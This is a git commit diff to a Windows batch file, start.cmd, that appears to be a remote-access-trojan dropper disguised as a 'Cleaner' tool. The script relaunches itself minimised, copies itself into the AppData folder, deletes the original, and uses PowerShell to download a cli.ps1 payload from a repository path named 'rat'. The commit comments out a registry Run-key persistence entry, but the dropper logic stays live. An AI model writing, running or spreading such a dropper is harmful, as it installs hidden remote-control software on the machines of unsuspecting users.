e51af2c4174012e0fa32ed7b813c3d763a38e072
Guillem <sjeje2553@gmail.com>
2026-02-24 13:29:14 +0100

    Comment out registry commands in start.cmd
    Commented out the registry addition commands and added a copy operation for the script.

--- start.cmd
+++ start.cmd
@@ -1,10 +1,10 @@
 @echo off
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
-/v MyApp ^
-/t REG_SZ ^
-/d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
-/f
+:: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
+:: /v MyApp ^
+:: /t REG_SZ ^
+:: /d "\"C:\%APPDATA%\Cleaner\start.cmd"" ^
+:: /f
 copy "%~f0" "%APPDATA%\Cleaner\start.cmd"
 del "%~f0"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
